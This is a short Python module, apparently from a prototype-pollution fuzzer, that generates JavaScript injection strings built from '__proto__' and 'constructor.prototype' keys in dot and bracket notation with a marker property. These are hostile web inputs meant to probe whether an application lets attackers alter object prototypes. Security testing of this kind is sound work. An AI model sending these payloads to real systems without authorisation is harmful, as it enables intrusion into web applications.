def get_payloads() -> list[str]:
    object_payloads = get_object_payloads()
    pointer_payloads = get_pointer_payloads()
    return object_payloads + pointer_payloads

def get_object_payloads() -> list[str]:
    prefix = "__proto__"
    suffixes = [
        ".ppfuzz",
        "[ppfuzz]",
        "['ppfuzz']",
        "[\"ppfuzz\"]",
        ".__proto__.ppfuzz",
        "[__proto__][ppfuzz]"
    ]
    return [f"{prefix}{suffix}" for suffix in suffixes]

def get_pointer_payloads() -> list[str]:
    prefix = "constructor"
    suffixes = [
        ".prototype.ppfuzz",
        "[prototype][ppfuzz]",
        "['prototype']['ppfuzz']", 
        "[\"prototype\"][\"ppfuzz\"]",
        ".prototype.test",
        "[prototype][test]"
    ]
    return [f"{prefix}{suffix}" for suffix in suffixes]
